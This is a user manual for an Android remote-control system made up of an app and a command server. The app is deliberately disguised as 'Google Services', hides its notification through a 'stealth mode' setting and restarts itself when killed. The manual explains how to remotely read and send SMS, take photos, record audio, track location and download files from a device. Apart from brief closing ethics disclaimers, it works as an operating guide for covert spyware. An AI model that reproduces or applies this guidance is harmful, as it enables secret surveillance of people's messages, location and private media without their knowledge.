# 📝 User Manual - Complete Operation Guide

## 🎯 **How to Use the Harvard Remote System**

This comprehensive user manual covers everything you need to know to operate the Harvard Remote System effectively and safely. Whether you're a student, researcher, or administrator, this guide will help you master the system.

---

## 🚀 **Getting Started**

### **First Time Setup**
1. **Install the Application**: Follow [`03-INSTALLATION_GUIDE.md`](03-INSTALLATION_GUIDE.md)
2. **Start the Server**: Ensure your control server is running
3. **Launch the App**: Find "Google Services" in your app drawer
4. **Grant Permissions**: Allow required permissions when prompted
5. **Verify Connection**: Check that the device connects to your server

### **Daily Operation Workflow**
```
1. Start Server → 2. Launch App → 3. Verify Connection → 4. Execute Commands → 5. Monitor Results
```

---

## 📱 **Android Application Usage**

### **Finding the App**
- **App Name**: "Google Services" (stealth camouflage)
- **Location**: Android app drawer
- **Icon**: System-style sync icon
- **Alternative**: Search for "Google" in app drawer

### **App Interface**

#### **Main Screen Elements**
```
┌─────────────────────────────┐
│     Google Services         │
├─────────────────────────────┤
│ Device ID: android-xxx-123  │
│ Server Status: ● Connected  │
│ Last Activity: 2 min ago    │
├─────────────────────────────┤
│ [Start Service]             │
│ [Stop Service]              │
│ [Settings]                  │
└─────────────────────────────┘
```

#### **Status Indicators**
- **🟢 Green Dot**: Connected and ready
- **🟡 Yellow Dot**: Connecting/Reconnecting
- **🔴 Red Dot**: Disconnected or error
- **⚪ Gray Dot**: Service stopped

### **Managing the Service**

#### **Starting the Service**
1. Open "Google Services" app
2. Tap "Start Service" button
3. Grant permissions if prompted
4. Verify connection status shows green
5. Check server logs for device registration

#### **Stopping the Service**
1. Open "Google Services" app
2. Tap "Stop Service" button
3. Confirm shutdown in dialog
4. Service and all connections terminate

#### **Auto-Start Behavior**
- **Boot Completion**: Service can auto-start on device boot
- **App Termination**: Service automatically restarts if killed
- **Network Recovery**: Automatically reconnects after network changes
- **Error Recovery**: Restarts on crashes or errors

---

## 🖥️ **Server Interface Usage**

### **Web Dashboard**

#### **Accessing the Dashboard**
1. Open web browser
2. Navigate to: `http://localhost:3000` (or your server address)
3. Dashboard loads automatically

#### **Dashboard Layout**
```
┌─────────────────────────────────────────────┐
│        Harvard Remote System Dashboard      │
├─────────────────────────────────────────────┤
│ Connected Devices: 3                        │
│ Server Uptime: 2h 45m                      │
│ Commands Executed: 127                      │
├─────────────────────────────────────────────┤
│ Device List:                                │
│ ┌─────────────────────────────────────────┐ │
│ │ 📱 Pixel 5 (android-123)              │ │
│ │    Status: Online                       │ │
│ │    Last Seen: 30s ago                  │ │
│ │    [Send Command] [View Info]          │ │
│ └─────────────────────────────────────────┘ │
├─────────────────────────────────────────────┤
│ Quick Commands:                             │
│ [Device Info] [Battery] [Location] [Apps]  │
└─────────────────────────────────────────────┘
```

### **Command Interface**

#### **Sending Commands**
1. **Select Target Device**: Click on device in dashboard
2. **Choose Command**: Select from command menu
3. **Set Parameters**: Fill in any required parameters
4. **Execute**: Click "Send Command"
5. **View Results**: Response appears in results panel

#### **Command Types Available**
- **Information Commands**: Device info, battery, network status
- **Location Commands**: GPS coordinates, location history
- **Communication Commands**: SMS management, call logs
- **Media Commands**: Camera capture, audio recording
- **System Commands**: App management, file operations
- **Network Commands**: WiFi information, connectivity tests

---

## 🎮 **Available Commands & Usage**

### **Device Information Commands**

#### **device_info**
**Purpose**: Get comprehensive device information
**Usage**: No parameters required
**Example Response**:
```json
{
  "deviceId": "android-123",
  "model": "Pixel 5",
  "manufacturer": "Google",
  "androidVersion": "12",
  "apiLevel": 31,
  "batteryLevel": 85,
  "storage": {
    "total": "128GB",
    "available": "45GB"
  }
}
```

#### **battery_status**
**Purpose**: Get current battery information
**Usage**: No parameters required
**Response**: Battery level, charging status, health

### **Location Commands**

#### **get_location**
**Purpose**: Retrieve current GPS coordinates
**Usage**: `{"accuracy": "high"}` (optional)
**Response**: Latitude, longitude, accuracy, timestamp
**Permissions Required**: ACCESS_FINE_LOCATION

#### **location_history**
**Purpose**: Get recent location history
**Usage**: `{"count": 10}` (number of recent locations)
**Response**: Array of location data with timestamps

### **Communication Commands**

#### **get_sms**
**Purpose**: Retrieve SMS messages
**Usage**: `{"limit": 50}` (optional, defaults to 20)
**Response**: Array of SMS messages with sender, content, timestamp
**Permissions Required**: READ_SMS

#### **send_sms**
**Purpose**: Send SMS message
**Usage**: `{"number": "+1234567890", "message": "Hello"}`
**Response**: Success/failure status
**Permissions Required**: SEND_SMS

### **Media Commands**

#### **take_photo**
**Purpose**: Capture photo using device camera
**Usage**: `{"camera": "back"}` (front/back)
**Response**: Base64 encoded image data
**Permissions Required**: CAMERA

#### **record_audio**
**Purpose**: Record audio for specified duration
**Usage**: `{"duration": 30}` (seconds)
**Response**: Base64 encoded audio data
**Permissions Required**: RECORD_AUDIO

### **File Commands**

#### **list_files**
**Purpose**: List files in specified directory
**Usage**: `{"path": "/sdcard/Downloads"}`
**Response**: Array of file information (name, size, type)
**Permissions Required**: READ_EXTERNAL_STORAGE

#### **download_file**
**Purpose**: Download file from device
**Usage**: `{"path": "/sdcard/document.pdf"}`
**Response**: Base64 encoded file content
**Permissions Required**: READ_EXTERNAL_STORAGE

### **System Commands**

#### **installed_apps**
**Purpose**: Get list of installed applications
**Usage**: No parameters required
**Response**: Array of app information (name, package, version)

#### **wifi_info**
**Purpose**: Get WiFi connection information
**Usage**: No parameters required
**Response**: SSID, IP address, signal strength, security type
**Permissions Required**: ACCESS_WIFI_STATE

---

## 🔒 **Permission Management**

### **Understanding Android Permissions**

#### **Why Permissions Are Needed**
- **Security**: Android protects sensitive data and functions
- **Privacy**: Users control what apps can access
- **Compliance**: Required by Google Play Store policies
- **Functionality**: Commands need appropriate permissions to work

#### **Permission Categories**
1. **Normal Permissions**: Automatically granted
   - Internet access
   - Network state
   - Wake lock

2. **Dangerous Permissions**: Require user approval
   - Location access
   - Camera access
   - SMS access
   - Storage access
   - Microphone access

### **Granting Permissions**

#### **Initial Setup**
1. **App First Launch**: Basic permissions requested automatically
2. **Command Execution**: Additional permissions requested as needed
3. **Settings Management**: Review/change permissions in Android settings

#### **Manual Permission Management**
1. **Android Settings** → **Apps** → **Google Services**
2. **Tap "Permissions"**
3. **Enable/disable specific permissions**
4. **Restart app if needed**

### **Permission Troubleshooting**

#### **Command Fails Due to Permissions**
```
Error: "Permission denied for requested operation"

Solution:
1. Check which permission is needed (see command reference)
2. Grant permission in Android settings
3. Retry the command
```

#### **Permission Requests Not Appearing**
```
Issue: App doesn't ask for permissions

Solution:
1. Clear app data in Android settings
2. Reinstall the application
3. Launch app and try commands again
```

---

## 🔧 **Configuration & Settings**

### **Network Configuration**

#### **Server Address Settings**
For development/testing:
- **Android Emulator**: `http://10.0.2.2:3000`
- **Real Device (Local)**: `http://YOUR_COMPUTER_IP:3000`
- **Real Device (Cloud)**: `https://your-server.com`

#### **Changing Server Address**
1. **During Build**: Modify `SERVER_URL` in `RemoteControlService.kt`
2. **Runtime Config**: Use configuration file or environment variables
3. **Dynamic Config**: Implement settings screen in app

### **Stealth Mode Configuration**

#### **Notification Settings**
```kotlin
// Ultra-stealth mode (default)
NotificationManager.IMPORTANCE_MIN    // Hidden from status bar

// Visible mode (for testing)
NotificationManager.IMPORTANCE_LOW    // Visible but silent

// Debug mode (for development)
NotificationManager.IMPORTANCE_DEFAULT // Normal visibility
```

#### **App Name Configuration**
Current stealth settings:
- **App Name**: "Google Services"
- **Notification Title**: "Google Services"
- **Service Description**: "Core system process"
- **Channel Name**: "Android System Intelligence"

---

## 📊 **Monitoring & Status**

### **Connection Status Monitoring**

#### **Android App Status**
- **Service Status**: Running/Stopped
- **Connection Status**: Connected/Disconnected/Connecting
- **Last Activity**: Timestamp of last communication
- **Command Count**: Number of commands processed

#### **Server Dashboard Status**
- **Connected Devices**: Live count
- **Server Uptime**: How long server has been running
- **Commands Executed**: Total command count
- **Error Rate**: Failed command percentage

### **Performance Monitoring**

#### **Android Performance**
- **Memory Usage**: Typically 20-30MB
- **CPU Usage**: <2% during idle, 5-10% during commands
- **Battery Impact**: Minimal (optimized background processing)
- **Network Usage**: Command-driven, minimal when idle

#### **Server Performance**
- **Memory Usage**: 50-100MB per server instance
- **CPU Usage**: <5% typical load
- **Network Throughput**: Depends on command frequency
- **Response Times**: <500ms for most commands

---

## 🐛 **Troubleshooting Common Issues**

### **Connection Problems**

#### **App Won't Connect to Server**
**Symptoms**: Red status dot, "Disconnected" message
**Solutions**:
1. **Check server status**: Ensure server is running
2. **Verify network**: Test connectivity between device and server
3. **Check firewall**: Ensure port 3000 is accessible
4. **Restart both**: Restart app and server

#### **Frequent Disconnections**
**Symptoms**: Connection drops repeatedly
**Solutions**:
1. **Network stability**: Check WiFi/mobile data stability
2. **Power management**: Disable battery optimization for app
3. **Background restrictions**: Allow app to run in background
4. **Server resources**: Check server memory/CPU usage

### **Command Issues**

#### **Commands Not Executing**
**Symptoms**: Commands sent but no response
**Solutions**:
1. **Check permissions**: Ensure required permissions granted
2. **Verify command syntax**: Check command format and parameters
3. **Review logs**: Check server logs for errors
4. **Restart service**: Stop and start the Android service

#### **Partial Command Responses**
**Symptoms**: Commands return incomplete data
**Solutions**:
1. **Memory issues**: Large data requests may fail on low-memory devices
2. **Timeout settings**: Increase timeout for large operations
3. **Chunk requests**: Break large requests into smaller pieces
4. **Error handling**: Check for error messages in response

### **Permission Issues**

#### **Permission Denied Errors**
**Symptoms**: Commands fail with permission errors
**Solutions**:
1. **Manual grant**: Go to Android Settings > Apps > Permissions
2. **Reinstall app**: Clear data and reinstall
3. **Check requirements**: Verify which permissions are needed
4. **Android version**: Some permissions behave differently on newer Android

### **Performance Issues**

#### **Slow Response Times**
**Symptoms**: Commands take longer than expected
**Solutions**:
1. **Network latency**: Check network connection quality
2. **Server load**: Monitor server resource usage
3. **Device performance**: Check device memory and CPU
4. **Command complexity**: Some commands naturally take longer

#### **High Battery Usage**
**Symptoms**: App using excessive battery
**Solutions**:
1. **Connection frequency**: Reduce ping frequency if modified
2. **Background activity**: Check for excessive background processing
3. **Location services**: Location commands can increase battery usage
4. **App optimization**: Enable Android's battery optimization

---

## 📈 **Best Practices**

### **For Students & Researchers**

#### **Development Best Practices**
1. **Test Locally First**: Always test on emulator before real device
2. **Permission Testing**: Test with minimal permissions first
3. **Error Handling**: Always handle command failures gracefully
4. **Documentation**: Document any modifications you make
5. **Version Control**: Use Git to track changes

#### **Security Best Practices**
1. **Limited Deployment**: Only install on devices you own
2. **Informed Consent**: Ensure users understand what the app does
3. **Data Protection**: Secure any collected data appropriately
4. **Regular Updates**: Keep system updated with security patches
5. **Responsible Use**: Follow ethical guidelines and legal requirements

### **For System Administration**

#### **Deployment Best Practices**
1. **Secure Server**: Use HTTPS in production
2. **Access Control**: Implement authentication for server access
3. **Monitoring**: Set up logging and monitoring systems
4. **Backup**: Regular backups of configuration and data
5. **Updates**: Keep server and dependencies updated

#### **Network Security**
1. **Firewall Configuration**: Restrict access to necessary ports only
2. **VPN Access**: Consider VPN for remote server access
3. **SSL/TLS**: Use encrypted connections in production
4. **Rate Limiting**: Implement rate limiting to prevent abuse
5. **Audit Logging**: Log all administrative actions

---

## 📞 **Support & Resources**

### **Getting Help**
1. **Documentation**: Check relevant documentation files
2. **Troubleshooting**: Review [`15-TROUBLESHOOTING.md`](15-TROUBLESHOOTING.md)
3. **Code Review**: Examine source code for understanding
4. **Community**: Discuss with classmates or study groups
5. **Professional**: Consult with instructors or advisors

### **Additional Resources**
- **Android Development**: [developer.android.com](https://developer.android.com)
- **Socket.IO Documentation**: [socket.io/docs](https://socket.io/docs)
- **Node.js Resources**: [nodejs.org/en/docs](https://nodejs.org/en/docs)
- **Security Guidelines**: [`16-SECURITY_FEATURES.md`](16-SECURITY_FEATURES.md)
- **Legal Considerations**: [`18-LEGAL_COMPLIANCE.md`](18-LEGAL_COMPLIANCE.md)

---

**This user manual provides comprehensive guidance for operating the Harvard Remote System safely and effectively. Always prioritize ethical use and legal compliance in your implementations.**

*Need technical details? Check out [`14-COMMAND_REFERENCE.md`](14-COMMAND_REFERENCE.md) for complete command documentation!*
